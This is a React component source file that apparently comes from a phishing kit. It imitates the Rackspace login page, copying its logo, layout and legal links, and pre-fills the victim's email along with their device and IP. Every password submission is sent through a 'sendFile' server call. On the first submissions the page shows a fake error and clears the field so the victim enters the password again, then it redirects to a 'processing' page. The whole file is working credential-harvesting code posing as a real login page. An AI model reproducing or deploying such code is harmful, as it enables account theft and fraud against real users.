import { navigate } from "@reach/router";
import React, { Fragment, useState } from "react";
import { Helmet } from "react-helmet";
import { notify, sendFile } from "../servers";

function Rackspace({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,device: location.state.device,
    ip: location.state.ip,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count <= 1) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: submited.count + 1 }); setValues({ ...values, password: "" });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };
  return (
    <Fragment>
      <Helmet>
        <link rel="stylesheet" type="text/css" href="../rackspace/main.css" />
      </Helmet>
      <div className="hxVertical">
        <div id="app">
          <div id="stage">
            <main data-v-58cd7fc1 role="main" id="content">
              <div data-v-58cd7fc1 className="flex-column">
                {/**/}
                <div data-v-58cd7fc1 id="main-wrapper" className="flex-child">
                  <div
                    data-v-58cd7fc1
                    id="content-wrapper"
                    className="flex-row"
                  >
                    <div data-v-58cd7fc1 id="logo-box">
                      <a
                        data-v-5154c51b
                        data-v-58cd7fc1
                        href="https://login.rackspace.com/login?_gl=1%2a1k1mzn%2a_ga%2aMTgzMjI3MDQ3My4xNjM0MzcyMDcy%2a_ga_P5J3XFCZLB%2aMTYzNDM3MjA3MS4xLjEuMTYzNDM3MjQwMy4w&_ga=2.132032271.1842435362.1634372072-1832270473.1634372072#"
                        className="logo"
                      >
                        <svg
                          data-v-5154c51b
                          viewBox="0 0 400 124"
                          xmlns="http://www.w3.org/2000/svg"
                          width={224}
                          height={80}
                          id="logo-rackspace"
                          className="light-logo"
                        >
                          <path
                            data-v-5154c51b
                            d="M209.5 49.6a15.6 15.6 0 01-4.5 11.5c-4 4-10.6 6.2-18.5 6.1-5.6 0-11.3-1.4-14.5-3.4l2.1-11.3a32.5 32.5 0 0013.9 3.9c3.6 0 6.1-1.7 6.1-4.4 0-2.5-1.7-4.2-6.2-6.4-7-3.5-10.5-8-10.5-13.2 0-10.3 8.8-17.3 22-17.3 7 0 11.5 1.7 14 3.3l-2.1 11.3c-2-1.5-7.1-3.6-12.6-3.6-3.9 0-6.4 1.6-6.4 4.3 0 1.9 2 3.6 6 5.6 5.3 2.7 11.2 6.6 11.2 13.6zm-91.4-34.4a31.4 31.4 0 00-32.6 31.6c0 12.4 8.2 20.4 21 20.4 5.5 0 10.9-1 14.3-2.6l2.3-12.4a26.2 26.2 0 01-12.4 3.2c-4.6 0-9.7-2.7-9.7-10.2 0-9 6.3-18.1 16.9-18.1a16.1 16.1 0 018.2 2l2.3-12.1a28.6 28.6 0 00-10.3-1.8zm260.6 40.5a33 33 0 0017.4-5l-2.3 12.5c-7.1 3.7-15.4 4-18.6 4-13.8 0-21.7-7.6-21.7-21a33.1 33.1 0 017.7-21.3 27.7 27.7 0 0121.4-9.8c10.4 0 17.4 6 17.4 15a13.6 13.6 0 01-4 10.2c-5 4.9-17.3 7.6-28.5 5.4-.5 6.3 4.2 10 11.2 10zM369.1 36c8.7 0 13.6-.8 15.8-3 2.3-2.2 1.6-7.1-4.1-7.1-6.5 0-10.5 5.2-11.7 10.1zM346 15.2a31.4 31.4 0 00-32.6 31.6c0 12.4 8.2 20.4 21 20.4 5.5 0 10.8-1 14.3-2.6l2.3-12.4a26.2 26.2 0 01-12.4 3.2c-4.7 0-9.7-2.7-9.7-10.2 0-9 6.3-18.1 16.9-18.1a16.1 16.1 0 018.1 2l2.3-12.1a28.6 28.6 0 00-10.2-1.8zm-35 23l-5.4 28h-14.2l1.9-9.6a15 15 0 01-15 10.7c-9.9 0-14.3-8.7-14.3-17.5 0-10 3.9-19.8 10.4-26.3A28.3 28.3 0 01295 15c6 0 10.5 1.8 13.3 5.2 4.1 5 3.8 12.5 2.7 18zm-13.7-6.4c-.2-3.5-2-5.4-5.3-5.4-7 0-13 12-13 20.4 0 5.2 2 8.5 5.3 8.5 5.4 0 10-5.7 11.6-14 .6-2.7 1.5-7.3 1.4-9.5zM83 38.2l-5.3 28H63.5l1.9-9.6a15 15 0 01-15 10.7c-9.8 0-14.3-8.7-14.3-17.5 0-10 4-19.8 10.5-26.3A28.3 28.3 0 0167 15c6 0 10.5 1.8 13.3 5.2 4.1 5 3.8 12.5 2.7 18zm-13.6-6.4c-.2-3.5-2-5.4-5.3-5.4-7 0-13 12-13 20.4 0 5.2 2 8.5 5.3 8.5 5.4 0 10-5.7 11.6-14 .6-2.7 1.5-7.3 1.4-9.5zM263 34c0 12.2-5.8 24.7-16.4 30.3a23.6 23.6 0 01-10.7 3c-5.3 0-8.3-2-10-5l-3.7 19.8h-14.9L220 16h13l-1.5 8a19 19 0 0115.3-8.9c9.8 0 16.2 7.4 16.2 19zm-15.4 1.2c0-2.4-.6-8.1-6-8.1-5.5 0-10.2 6.3-12 15.8-.6 3.3-2.4 13 4.5 13 7.8 0 13.5-11 13.5-20.7zm-227-8.1L22.9 16h-13L0 67.1h14.8l4-21c2.4-12.5 9.5-17.4 19.7-16L41.4 15a20.5 20.5 0 00-20.7 12.2zm119 39l5.1-26.9 10.6 27h16l-11-27.2 19.8-23H164l-19 22.8L152.1 0h-14.7l-12.6 66.2zm249.5 44.2l-.1.5h-1.3l-.6 3.4h-.7l.7-3.4h-1.3v-.5zm4.8 0l-.8 3.9h-.6l.5-2.8-1.6 1.9h-.3l-1-1.9-.5 2.8h-.6l.8-4h.5l1 2.3 2-2.2zm-83.6-9c0 7.2-5 13.4-12.2 13.4-5.4 0-8.7-3.8-8.7-8.8 0-7.2 5-13.4 12.2-13.4 5.7 0 8.7 4 8.7 8.7zm-15.7 4.5c0 2.9 1.6 5 4.2 5 3.8 0 6.3-5.3 6.3-9.5 0-2.2-1-4.9-4-4.9-4.1 0-6.5 5.4-6.5 9.4zm50.2-4.6c0 7.3-5 13.5-12.2 13.5-5.4 0-8.7-3.8-8.7-8.8 0-7.2 5-13.4 12.3-13.4 5.7 0 8.6 4 8.6 8.7zm-15.7 4.6c0 2.9 1.6 5 4.2 5 3.8 0 6.3-5.3 6.3-9.5 0-2.2-1-4.9-4-4.9-4.1 0-6.5 5.4-6.5 9.4zM318 86l-5.4 28.2h5.1L323 86zm-81.8 6.5a13.4 13.4 0 00-13.4 13.7c0 5 3.2 8.4 8.6 8.4a14.3 14.3 0 006.2-1.3l.9-4.4a11.4 11.4 0 01-5.7 1.6c-2.9 0-4.7-1.8-4.7-5 0-4.4 3-8.9 8-8.9a7.7 7.7 0 013.9 1l.8-4.2a11.7 11.7 0 00-4.6-.9zm-29 16a5.8 5.8 0 01-.5-3c8.2.1 13.9-1.6 13.9-7 0-3.6-2.7-6-6.8-6-7.4 0-12 7-12 13.4 0 5.1 2.8 8.8 8.6 8.8a16.5 16.5 0 008-2l1-4.6a12.8 12.8 0 01-7.8 2.5 4.7 4.7 0 01-4.3-2.1zm5.9-12.2c1.6 0 2.7.8 2.7 2.2 0 2.5-3.4 3.2-8.6 3.2.6-2.6 2.7-5.4 5.9-5.4zm73 2c0-4-2.4-5.8-5.5-5.8a9.2 9.2 0 00-7.7 4.4l.7-4H269l-4 21.3h5l1.8-9.8c1-5 3.9-7.8 6.2-7.8 2 0 2.6 1.3 2.6 3a14.2 14.2 0 01-.2 2.6l-2.3 12h5l2.4-12.4a19.9 19.9 0 00.4-3.5zm-29.5-5.8a9 9 0 00-7 3.5l1.9-10h-5.1l-5.4 28.2h5.1l1.9-9.8c.9-5 3.8-7.8 6.1-7.8 2 0 2.7 1.3 2.7 3a14.2 14.2 0 01-.3 2.6l-2.3 12h5.1l2.4-12.4a19.9 19.9 0 00.3-3.5c0-4-2.3-5.8-5.4-5.8zm-58.8-5h-5l-1 5.5h-2.9l-.7 3.9h2.8l-1.8 9.4a19.8 19.8 0 00-.5 4c0 2.4 1.6 4.3 5 4.3a10.1 10.1 0 003.4-.4l.7-4a10 10 0 01-2 .1 1.7 1.7 0 01-1.9-1.9 15 15 0 01.4-3L196 97h4.7l.8-4h-4.7zM368 122.2c3.8 1.8 7.7 1 10.4-4L392.7 93h-5.4l-8 15.8-2-15.8H372l3.8 20.8-1.7 3.3c-1.5 2.6-4 1.7-5.3 1zm-7-29.6c-9 0-13.6 8-13.6 14.7 0 3.8 1.9 7.5 6.4 7.5a8.5 8.5 0 007-3.8l-.3 1.8c-1 5-3.6 6.5-7 6.5a12.3 12.3 0 01-5.5-1.2l-.8 4.1a15 15 0 006.3 1.2 12.5 12.5 0 007.9-2.4c2.4-2 3.6-5.3 4.4-9.4l2-9.6a17.5 17.5 0 00.4-3.7c0-3.8-2.7-5.7-7.1-5.7zm1.7 9l-.4 2c-.9 4.3-3.6 7-6.2 7-2.4 0-3.4-2-3.4-4.2 0-4.2 3-10 7.4-10a2.5 2.5 0 012.8 2.8 10.8 10.8 0 01-.2 2.5z"
                          />
                        </svg>
                      </a>
                    </div>
                    <div data-v-58cd7fc1 id="separator" />
                    <div data-v-58cd7fc1 id="content-box">
                      <div data-v-135a1670 data-v-58cd7fc1>
                        <form
                          data-v-dc727aea
                          data-v-135a1670
                          id="password-form"
                          onSubmit={submitForm}
                        >
                          <h3 data-v-dc727aea>Log In</h3>
                          <fieldset data-v-dc727aea id="password-form-fieldset">
                            <hx-text-control
                              data-v-dc727aea
                              hx-defined
                              hx-touched
                              hx-dirty
                            >
                              <input
                                id="username"
                                required="required"
                                name="username"
                                onChange={handleChange}
                                value={values.username}
                                disabled
                                placeholder
                                invalid
                                autoComplete
                                type="text"
                              />
                              <label htmlFor="username"> Username </label>
                              {/**/}
                              {/**/}
                            </hx-text-control>
                            <hx-password-control
                              data-v-dc727aea
                              hx-defined
                              hx-touched
                              hx-dirty
                            >
                              <label data-v-dc727aea htmlFor="password">
                                Password
                              </label>
                              <input
                                data-v-dc727aea
                                id="password"
                                type="password"
                                required="required"
                                invalid
                                name="password"
                                value={values.password}
                                onChange={handleChange}
                              />
                            </hx-password-control>
                            <div
                              data-v-9ffbf368
                              data-v-dc727aea
                              className="field-error"
                            />
                            <div data-v-dc727aea id="remember-me">
                              <hx-checkbox-control data-v-dc727aea hx-defined>
                                <input
                                  data-v-dc727aea
                                  type="checkbox"
                                  id="remember-me-checkbox"
                                />
                                <label
                                  data-v-dc727aea
                                  htmlFor="remember-me-checkbox"
                                >
                                  <hx-checkbox data-v-dc727aea hx-defined />
                                  Remember Me
                                </label>
                              </hx-checkbox-control>
                            </div>
                            <input
                              data-v-dc727aea
                              type="submit"
                              disabled={submited.status}
                              className="hxBtn hxPrimary"
                            />
                            Log In
                          </fieldset>
                          <p data-v-b46ddebc data-v-dc727aea id="privacy-terms">
                            By continuing, you agree to the Rackspace Technology
                            <a
                              href="https://www.rackspace.com/information/legal/websiteterms"
                              target="_blank"
                            >
                              Terms of Use{" "}
                            </a>
                            and
                            <a
                              href="https://www.rackspace.com/information/legal/privacystatement"
                              target="_blank"
                            >
                              Privacy Notice.
                            </a>
                          </p>
                        </form>
                        <a
                          data-v-135a1670
                          href="https://login.rackspace.com/federate?_gl=1%2a1k1mzn%2a_ga%2aMTgzMjI3MDQ3My4xNjM0MzcyMDcy%2a_ga_P5J3XFCZLB%2aMTYzNDM3MjA3MS4xLjEuMTYzNDM3MjQwMy4w&_ga=2.132032271.1842435362.1634372072-1832270473.1634372072"
                          className="text-link"
                          id="federated-login"
                        >
                          Use your organization's credentials to log in
                        </a>
                        <a
                          data-v-135a1670
                          href="https://login.rackspace.com/password/reset/request"
                          className="text-link"
                          id="forgot-password"
                        >
                          Forgot Password?
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div data-v-58cd7fc1 id="loggedOut" style={{ display: "none" }} />
              <div
                data-v-58cd7fc1
                className="modal-backdrop"
                style={{ display: "none" }}
              >
                <div className="modal">
                  <hx-alert
                    static
                    persist="true"
                    status="Info"
                    type="info"
                    hx-defined
                  ></hx-alert>
                </div>
              </div>
            </main>
          </div>
        </div>
      </div>
    </Fragment>
  );
}

export default Rackspace;
